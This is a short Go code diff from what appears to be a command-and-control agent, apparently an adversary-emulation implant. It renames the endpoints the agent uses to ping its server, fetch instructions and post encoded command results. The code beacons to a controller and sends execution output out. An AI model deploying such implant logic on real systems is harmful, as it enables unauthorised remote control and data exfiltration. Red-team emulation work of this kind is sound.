@@ -22,7 +22,7 @@ type API struct { }
 
 //Ping tests connectivity to the server
 func (contact API) Ping(server string) bool {
-	address := fmt.Sprintf("%s/sand/ping", server)
+	address := fmt.Sprintf("%s/ping", server)
 	bites := request(address, nil)
 	if string(bites) == "pong" {
 		output.VerbosePrint("[+] Ping success")
@@ -35,7 +35,7 @@ func (contact API) Ping(server string) bool {
 //GetInstructions sends a beacon and returns instructions
 func (contact API) GetInstructions(profile map[string]interface{}) map[string]interface{} {
 	data, _ := json.Marshal(profile)
-	address := fmt.Sprintf("%s/sand/instructions", profile["server"])
+	address := fmt.Sprintf("%s/instructions", profile["server"])
 	bites := request(address, data)
 	var out map[string]interface{}
 	if bites != nil {
@@ -92,7 +92,7 @@ func drop(server string, payload string) string {
 }
 
 func sendExecutionResults(commandID interface{}, server interface{}, result []byte, status string, cmd string, pid string) {
-	address := fmt.Sprintf("%s/sand/results", server)
+	address := fmt.Sprintf("%s/results", server)
 	link := fmt.Sprintf("%s", commandID.(string))
 	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode(result)), "status": status, "pid": pid})
 	request(address, data)
